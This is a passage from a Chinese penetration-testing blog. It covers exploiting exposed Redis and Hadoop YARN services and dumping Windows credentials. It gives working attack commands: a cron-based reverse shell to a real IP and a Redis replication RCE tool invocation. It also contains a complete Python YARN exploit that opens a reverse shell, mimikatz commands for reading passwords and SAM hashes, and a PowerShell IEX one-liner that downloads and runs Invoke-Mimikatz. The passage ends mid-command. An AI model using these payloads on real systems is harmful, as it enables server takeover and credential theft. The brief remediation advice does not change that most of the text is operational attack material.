title="写公钥"></a>写公钥</h3><h4 id="公私钥登录"><a href="#公私钥登录" class="headerlink" title="公私钥登录"></a>公私钥登录</h4><ol><li><p>生成公私钥  ssh-keygen</p><p>公钥存放在  <code>id_rsa.pub</code></p><p>私钥存放在  <code>id_rsa</code></p></li><li><p>安装公私钥</p><p>root文件：<code>/root/.ssh/authorized_keys</code></p><p>其他用户文件：<code>/home/user/.ssh/authorized_keys</code></p></li><li><p>注意</p><p>其实写公钥的意思就是说，将我们自己的公钥写入到他的<code>authorized_keys</code></p></li></ol><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>由于vps已经有windows的公钥，现在尝试使用kali</p><ol><li><p>kali连接vps redis</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111133512564.png" alt="image-20240111133512564"></p></li><li><p>kali生成 密钥，然后保存到文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111133912968.png" alt="image-20240111133912968"></p></li><li><p>创建key-value</p><p>value为公钥</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111134146455.png" alt="image-20240111134146455"></p></li><li><p>将value保存到authorized_keys</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111134850510.png" alt="image-20240111134850510"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111134803781.png" alt="image-20240111134803781"></p></li><li><p>尝试登录</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111135044122.png" alt="image-20240111135044122"></p><p>可以发现，虽然能连接上但是由于root用户存在密码就不能登录了</p><p><strong>这个也是不经常用这个的原因</strong></p></li><li><p>缺点</p><ul><li>需要对redis flushall</li><li>ssh 不一定允许root登录</li><li>ssh 可能不对公网打开</li><li>服务器不一定有ssh 服务 ***重要</li></ul></li></ol><h3 id="写计划任务（常用）"><a href="#写计划任务（常用）" class="headerlink" title="写计划任务（常用）"></a>写计划任务（常用）</h3><p>因为linux一定存在计划任务</p><p>一般的定时任务路径是在</p><blockquote><p>&#x2F;var&#x2F;spoll&#x2F;cron</p><p>&#x2F;etc&#x2F;crontab</p></blockquote><p>其实思路都是一样的，就是实利用redis可以保存数据库数据为文件的这么一个操作，我们就可以以此来写很多东西</p><blockquote><p>CONFIG SET dir &#x2F;var&#x2F;spool&#x2F;cron</p><p>config set dbfilename root  </p><p>set xxx  “\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124.71.45.28&#x2F;4433 0&gt;&amp;1\n\n”</p><p>save</p></blockquote><p>现在我们观察一下这个定时任务的格式是怎么样的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240112200210287.png" alt="image-20240112200210287"></p><ul><li>首先前后有两个换行符</li><li>然后有五颗星，分别代表了 分钟 小时 天 月  星期几  然后执行的命令</li></ul><p>接下来我们来分析一下写redis的步骤 </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240112200620667.png" alt="image-20240112200620667"></p><p>最后就是不要忘记了<strong>save</strong></p><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><h4 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h4><p>windows :   .dll</p><p>linux:    .so</p><p>回顾一个知识点</p><p>php 的代码执行函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>()<br><span class="hljs-title function_ invoke__">shell_exec</span>()<br><span class="hljs-title function_ invoke__">exec</span>()<br><span class="hljs-title function_ invoke__">passthru</span>()<br><span class="hljs-title function_ invoke__">popen</span>()<br></code></pre></td></tr></table></figure><p>如果遇到了函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">disable_fuctions</span>()<br></code></pre></td></tr></table></figure><p>这个函数的作用是禁用某个函数</p><p>有一个问题如何绕过它</p><blockquote><ol><li><p>没有禁用全的话，可以尝试利用</p></li><li><p>创建一个新的函数</p><p>就是使用.so .dll</p></li><li><p>把php打爆  uaf漏洞</p></li><li><p>把Linux打爆  bash脱壳</p></li></ol></blockquote><p>回过头来说，现在Redis没有可以执行的函数，现在这么办呢？</p><p>接下来的操作会使用到脚本</p><blockquote><p><a href="https://github.com/puckiestyle/RedisModules-ExecuteCommand">https://github.com/puckiestyle/RedisModules-ExecuteCommand</a><br><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a><br><a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a><br><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a><br><a href="https://github.com/0671/RabR">https://github.com/0671/RabR</a></p></blockquote><p>我使用的是最后一个</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git clone https:<span class="hljs-comment">//github.com/0671/RabR.git</span><br>cd RabR<br><br>python3 redis-attack<span class="hljs-selector-class">.py</span> -r target<span class="hljs-selector-class">.yijinglab</span><span class="hljs-selector-class">.com</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">52257</span> -L <span class="hljs-number">8.219</span>.<span class="hljs-number">161.88</span> <span class="hljs-attr">--brute</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240112211452585.png" alt="image-20240112211452585"></p><p>这个脚本的功能就是将我们的动态链接库生成到对应的Redis主机，相当于帮他创建了一个执行任意代码的函数</p><p>原理</p><p><a href="https://blog.csdn.net/a745233700/article/details/112404218">Redis主从复制原理-CSDN博客</a></p><blockquote><p>简单理解为，我们创建一个动态来链接库文件，之后通过redis的主从复制功能将其下载下来然后架并且加载这个动态链接库，这个动态链接库的内容就是一个命令执行函数，所以我们可以反弹回shell</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>redis的利用有四种方法</p><blockquote><ol><li><p>获取webshell</p><p>这个需要有写权限，对于windows来说马，你还必须知道这个服务的绝对路径</p></li><li><p>写公钥</p><p>我个人认为直接覆盖这个文件，是有很大的弊端</p></li><li><p>定时任务</p><p>可能不能正常返回，高版本下直接回禁用config set</p></li><li><p>主从复制</p><p>记住windwos主要使用的方法</p></li></ol></blockquote><h1 id="Hadoop未授权访问"><a href="#Hadoop未授权访问" class="headerlink" title="Hadoop未授权访问"></a>Hadoop未授权访问</h1><p>这个是一个开源的分布式的计算框架，用于处理大规模数据和存储问题</p><p><a href="https://www.runoob.com/w3cnote/hadoop-tutorial.html">1.0 Hadoop 教程 | 菜鸟教程 (runoob.com)</a></p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Hadoop YARN（Yet Another Resource  Negotiator）用于集群资源管理和作业调度，是Hadoop集群的资源管理系统。  </p><p>YARN 提供有默认开放在8088和8090的REST  API（默认8088）允许用户直接通过API进行相关的应  用创建、任务提交执行等操作，如果配置不当可导致未授权访问的问题，攻击者无需认证即可通过  REST API部署任务来执行任意指令，最终完全控制服务器。</p><blockquote><p>总结来说，这个配置文件如果开发者不开的话，可能就无法访问了，但是有些开发者偏要开，那就是为了不让我们失业</p></blockquote><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">version: <span class="hljs-string">&#x27;2&#x27;</span><br><br>services:<br>  namenode:<br>    image: vulhub/hadoop:<span class="hljs-number">2.8</span>.<span class="hljs-number">1</span><br>    environment:<br>      - HDFS_CONF_dfs_namenode_name_dir=file:///hadoop/dfs/name<br>      - CLUSTER_NAME=vulhub<br>      - HDFS_CONF_dfs_replication=<span class="hljs-number">1</span><br>    command: /namenode.sh<br><br>  datanode:<br>    image: vulhub/hadoop:<span class="hljs-number">2.8</span>.<span class="hljs-number">1</span><br>    environment:<br>      - HDFS_CONF_dfs_datanode_data_dir=file:///hadoop/dfs/data<br>      - CORE_CONF_fs_defaultFS=hdfs://namenode:<span class="hljs-number">8020</span><br>      - CLUSTER_NAME=vulhub<br>      - HDFS_CONF_dfs_replication=<span class="hljs-number">1</span><br>    command: /datanode.sh<br><br>  resourcemanager:<br>    image: vulhub/hadoop:<span class="hljs-number">2.8</span>.<span class="hljs-number">1</span><br>    environment:<br>      - CORE_CONF_fs_defaultFS=hdfs://namenode:<span class="hljs-number">8020</span><br>      - YARN_CONF_yarn_log___aggregation___enable=true<br>    command: /resourcemanager.sh<br>    ports:<br>      - <span class="hljs-string">&quot;8088:8088&quot;</span><br><br>  nodemanager:<br>    image: vulhub/hadoop:<span class="hljs-number">2.8</span>.<span class="hljs-number">1</span><br>    environment:<br>      - CORE_CONF_fs_defaultFS=hdfs://namenode:<span class="hljs-number">8020</span><br>      - YARN_CONF_yarn_resourcemanager_hostname=resourcemanager<br>      - YARN_CONF_yarn_log___aggregation___enable=true<br>      - YARN_CONF_yarn_nodemanager_remote___app___log___dir=/app-logs<br>    command: /nodemanager.sh<br></code></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># 漏洞目标 URL</span><br>target = <span class="hljs-string">&#x27;http://192.168.81.127:8088/&#x27;</span><br><span class="hljs-comment"># 反弹Shell 攻击机IP地址</span><br>lhost = <span class="hljs-string">&#x27;192.168.81.238&#x27;</span><br><br>url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;target&#125;</span>ws/v1/cluster/apps/new-application&#x27;</span><br>resp = requests.post(url).content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>resp_json = json.loads(resp)<br><br>app_id = resp_json[<span class="hljs-string">&#x27;application-id&#x27;</span>]<br>url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;target&#125;</span>ws/v1/cluster/apps&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;application-id&#x27;</span>: app_id,<br>    <span class="hljs-string">&#x27;application-name&#x27;</span>: <span class="hljs-string">&#x27;get-shell&#x27;</span>,<br>    <span class="hljs-string">&#x27;am-container-spec&#x27;</span>: &#123;<br>        <span class="hljs-string">&#x27;commands&#x27;</span>: &#123;<span class="hljs-string">&#x27;command&#x27;</span>: <span class="hljs-string">f&#x27;/bin/bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">&#123;lhost&#125;</span>/5566 0&gt;&amp;1&#x27;</span>&#125;<br>    &#125;,<br>    <span class="hljs-string">&#x27;application-type&#x27;</span>: <span class="hljs-string">&#x27;YARN&#x27;</span>,<br>&#125;<br>requests.post(url, json=data)<br></code></pre></td></tr></table></figure><p>注意这个攻击机得监听着，不然反弹不了shell</p><p>接下来我们来实操一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240113092016975.png" alt="image-20240113092016975"></p><p>启动一下docker</p><p>然后执行上面的代码就可以了</p><p>原理：</p><ol><li>调用 New Application API 创建 Application</li></ol>   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">NewApplication</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">application-id</span>&gt;</span>application_1688957760252_0004<span class="hljs-tag">&lt;/<span class="hljs-name">application-id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">maximum-resource-capability</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">memory</span>&gt;</span>8192<span class="hljs-tag">&lt;/<span class="hljs-name">memory</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">vCores</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">vCores</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">maximum-resource-capability</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">NewApplication</span>&gt;</span><br>   <br></code></pre></td></tr></table></figure><ol start="2"><li><p>调用 Submit Application API 提交命令</p><p>  POST请求 <a href="http://ip:8088/ws/v1/cluster/apps%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">http://ip:8088/ws/v1/cluster/apps，提交执行命令</a></p></li></ol><h2 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><ol><li><p>fofa</p><blockquote><p>  app&#x3D;”APACHE-hadoop-YARN”  </p></blockquote></li><li><p>POST请求</p><blockquote><p>  向 <a href="http://ip:port/ws/v1/cluster/apps/new-application">http://ip:port/ws/v1/cluster/apps/new-application</a> 发送POST请求，如果响应返回  application-id，则表明存在漏洞</p></blockquote></li></ol><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>其实可以看得出来，我们只要对某些地区做好了身份验证就可以避免对大多数的事故了</p><ol><li>如无必要，关闭 Hadoop Web 管理页面。</li><li>开启身份验证，没有授权的用户禁止访问</li><li>可以设置安全组，只有受信任的Ip才能访问某一些api</li></ol><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>对于这个漏洞，我们不难看出很多安全事故都是由于没有对相应的api做授权管理。现在前后端的开发模式，偏向api调用，就是后端写好了api前端调用然后获取对应的数据。</p><p>只需要对api 做身份认证就可以防止未授权访问</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>工作组密码凭证获取</title>
    <link href="/2024/01/10/%E6%B8%97%E9%80%8F/%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/"/>
    <url>/2024/01/10/%E6%B8%97%E9%80%8F/%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="windows密码凭证获"><a href="#windows密码凭证获" class="headerlink" title="windows密码凭证获"></a>windows密码凭证获</h1><h2 id="windwos-hash"><a href="#windwos-hash" class="headerlink" title="windwos hash"></a>windwos hash</h2><ol><li><p>hash 简介</p><p>这个加密函数对一个任意长度的字符串数据进行一次数学加密函数运算，然后返回一个固定长度的字符串。  </p><p>简单地说，就是将一个任意长度的消息压缩到某个固定的长度的信息摘要的函数</p></li><li><p>windows hash</p><ul><li><p>简单地说就是windwos用户的密码经过hash加密之后，就被称为windwos hash</p></li><li><p>对于windows系统来说，现在有两种方式及进行hash</p><p>LAN Manager(LM)哈希和NTLAN(NTLM)哈希</p></li><li><p>对于最新的windwos系统来说，<strong>使用NTLMv2 以及 Kerberos 验证体系</strong></p></li></ul><table><thead><tr><th></th><th>2000</th><th>xp</th><th>2003</th><th>vista</th><th>win7</th><th>2008</th><th>2012</th></tr></thead><tbody><tr><td>LM</td><td>√</td><td>√</td><td>√</td><td></td><td></td><td></td><td></td></tr><tr><td>NTLM</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p><strong>对于前面三个系统来说，当密码超过了14位才会使用NTML加密</strong></p><blockquote><p>  用户名称:RID:LM-HASH值:NTLM-HASH值  </p><p>test:1003:E52CAC67419A9A22664345140A852F61:67A54E1C9058FCA16498061B96863248:::</p></blockquote><p>windwos的系统密码hash默认情况下由两个部分组成目的一个部分是LM-HASH，第二个部分是NTML-HASH</p><p><strong>当LM-HASH是AAD3B435B51404EE（分界符，密码不包含这个）AAD3B435B51404EE表示空密码，或者是未使用NTML-HASH</strong></p><p>windwos hash储存的地方有两个</p><p>对于本机，存储到对应用户的，的文件位置</p><blockquote><p>C:\windows\system32\config\SAM</p></blockquote><p>对于域环境来说文件，文件存储在域控上面</p><blockquote><p>  C:\windows\NTDS\NTDS.dit  </p></blockquote></li><li><p>LM-HASH</p></li></ol><p>   LM-HASH  是windows系统使用的第一种密码算法，这个算法由于比较古老了很容易通过暴力破解得到明文凭据</p><p>   这个密码算法在LAN Manager协议当中使用</p><p>   一直等到NT LAN Manager(NTML)哈希的出现</p><p>   使用范围：</p><blockquote><p>windows xp &#x2F;windows server 2003 之前</p></blockquote><p>   从windows vista &#x2F; windows server 2008开始默认情况下就已经禁用了该算法</p><p>   LM算法基础是 DES</p><p>   生成原理</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240110194412201.png" alt="image-20240110194412201"></p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240110194504355.png" alt="image-20240110194504355"></p><p>   缺点：</p><ol><li><p>密码长度最大只能为14位</p></li><li><p>密码不区分大小写</p></li><li><p>如果密码长度小于7，那么密码hash之后是固定的</p></li><li><p>一个14个字符的密码分成7+7个字符，并且分别为这两个半部分计算哈希值。这种计算哈希值的方式  使破解难度成倍增加，因为攻击者需要将7个字符（而不是14个字符）强制暴力破解。这使得14个字  符的密码的有效强度等于，或者是7个字符的密码的两倍，该密码的复杂度明显低于14个字符的密码  的理论强度  </p></li><li><p>DES密码强度不高</p></li><li><p>NTLM-HASH  </p></li><li><p>NT LAN Manager(NTML)</p><p>NT LAN Manager(NTML)hash是Windwos系统认可的算法，取代了老的LM-HASH，一般保存在Security Account Manager（SAM）中</p><p>windows vista&#x2F;windwos 7&#x2F;windows server 2008以及后面的系统中，NTML哈希算法默认是启用的</p></li></ol><h2 id="windwos认证基础"><a href="#windwos认证基础" class="headerlink" title="windwos认证基础"></a>windwos认证基础</h2><ol><li><p>windows认证包括三个部分</p><ul><li><p>本地认证：</p><p>用户直接操作计算机登录账户</p></li><li><p>网络认证</p><p>远程连接到工作组中的某个设备</p></li><li><p>域认证</p><p>登录到与环境中的某一个设备</p></li></ul></li><li><p>本地认证</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110205719351.png" alt="image-20240110205719351"></p><p>通过这个图，我们可以知道，我们可以直接从lsass.exe中获取到明文密码</p><p>具体的过程是：</p><ul><li><p>用户输入密码（winlogon.exe）</p></li><li><p>系统收到密码后将用户的输入的密码算成NTML-HASH</p></li><li><p>与SAM数据库中的数据对比</p><p>数据库的文件在</p><blockquote><p>（%SystemRoot%\system32\config\sam）</p></blockquote></li><li><p>匹配则登录成功，不匹配则登录失败</p></li></ul><blockquote><p>  本地认证中用来处理用户输入密码的进程为 lsass.exe ，密码会在这个进程中明文保存，供该进程  将密码计算成 NTLM Hash 与 SAM 进行比对，我们使用 mimikatz 来获取的明文密码，便是在这个进  程中读取到的  </p></blockquote></li><li><p>网络认证</p><p>网络认证即在工作组环境下远程登陆另一台电脑所采用的认证机制  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110210245240.png" alt="image-20240110210245240"></p><p>NTML协议的认证过程分为3步，也叫挑战相应机制</p><pre><code class=" mermaid">graph TBclient(客户端发送用户名+密码)--&gt;server(服务端查询是否存在)server--&gt;|没有用户|noUser(认证失败)server--&gt;|存在用户|havaUser(随记生成16位challenge,本地的密码加密,生成challenge1)havaUser--&gt;clientChanlenge(发送未加密的chalenge给client)clientChanlenge--&gt;getChanlenge(使用用户密码对chalenge加密,并将结果发送server)getChanlenge--&gt;exChanllenge(对比)exChanllenge--&gt;|不匹配|noUserexChanllenge--&gt;|匹配|ok(认证失败)</code></pre><p><strong>A. 协商</strong></p><blockquote><p>就是讨论使用哪个版本，因为NTML有两个版本</p></blockquote><p> 双方确定使用的协议版本，NTLM 存在V1和V2两个版本，即 Net-NTLM v1 hash、Net-NTLM v2  hash，具体区别就是加密方式不同  </p><p>  在NTLM认证中，NTLM响应分为NTLM v1，NTLMv2，NTLM session v2三种协议，不同协议使用不  同格式的Challenge 和加密算法  </p><p><strong>B. 质询</strong></p><ol><li><p>客户端向服务器端发送用户信息(用户名)请求  </p></li><li><p>服务器接受到请求后，判断本地用户列表是否存在客户端发送的用户名，如果没有返回认证失败，如  果有，生成一个16位的随机数，被称之为”Challenge”， 然后使用登录用户名对应的NTLM Hash加密  Challenge(16位随机字符)， 生成Challenge1保存在内存中。同时，生成Challenge1后，将  Challenge(16位随机字符)明文发送给客户端。  </p></li><li><p>客户端接受到Challenge后，使用自己提供的账户的密码转换成对应的NTLM  Hash，然后使用这个</p></li></ol><p>NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</p><p><strong>C. 验证</strong></p><p>  在质询完成后，验证结果，是认证的最后一步。  </p><p>  服务端收到客户端发送的Response后，与之前保存在内存中的Channelge1比较，如果相等认证通过  其中，经过NTLM  Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash（不能直接用来  </p><p>  进行哈希传递攻击，但可以通过暴力破解来获取明文密码）  </p><p>  其中的关键点在于：第二步中客户端发送的是 NTLM 哈希值与随机字符串加密的结果，而这个 NTLM  哈希是由用户输入的密码本地计算得出的，所以在这个步骤中，只要能提供正确的 NTLM 哈希即使不知道正确的密码也可通过认证</p></li></ol><h2 id="系统用户凭证获取"><a href="#系统用户凭证获取" class="headerlink" title="系统用户凭证获取"></a>系统用户凭证获取</h2><h3 id="Mimikatz-猕猴桃"><a href="#Mimikatz-猕猴桃" class="headerlink" title="Mimikatz 猕猴桃"></a>Mimikatz 猕猴桃</h3><p>这个需要在管理员权限下使用</p><blockquote><p>  <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a>  </p></blockquote><ol><li><p>获取命令</p><p>随便输入一个字符</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110213933133.png" alt="image-20240110213933133"></p></li><li><p>获取模块</p><p>可以输入两个<code>::</code></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110213957620.png" alt="image-20240110213957620"></p></li></ol><p>下面以两种模式简绍</p><ol><li><p>本地交互模式</p><p>建议都先提权</p><ul><li><p>提权</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br></code></pre></td></tr></table></figure><p>提权到可调式权限</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110214308301.png" alt="image-20240110214308301"></p></li><li><p>记录日志</p><p>会记录我们所操作的命令和结果</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-built_in">log</span> <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p>记录到1.txt</p></li><li><p>获取密码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110214838397.png" alt="image-20240110214838397"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure></li><li><p>获取hash</p><p>连着一起使用</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">token:</span>:elevate  <span class="hljs-meta"># 可以获取system权限</span><br>log res.txt<br><span class="hljs-symbol">lsadump:</span>:sam<br><span class="hljs-symbol">lsadump:</span>:secrets<br></code></pre></td></tr></table></figure></li></ul></li><li><p>powersehll本地执行mimikatz脚本</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">powershell -ep bypass <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;<span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords&quot;</span>&#x27;<br>powershell -ep bypass <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;<span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::sam&quot;</span>&#x27;<br>   <br></code></pre></td></tr></table></figure></li><li><p>powersehll远程执行mimikatz脚本</p><p>需要托托管到远程</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">powershell IEX (New-ObjectNet.WebClient).<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>192.168.81.154:8000<span class="hljs-operator">/</span>Invoke-Mimikatz.<span class="hljs-params">ps1</span>&#x27;)</span>;Invoke-Mimikatz –DumpCreds<br>powershell IEX (New-Object Net.WebClient).<span class="hljs-constructor">DownloadString(&#x27;<span 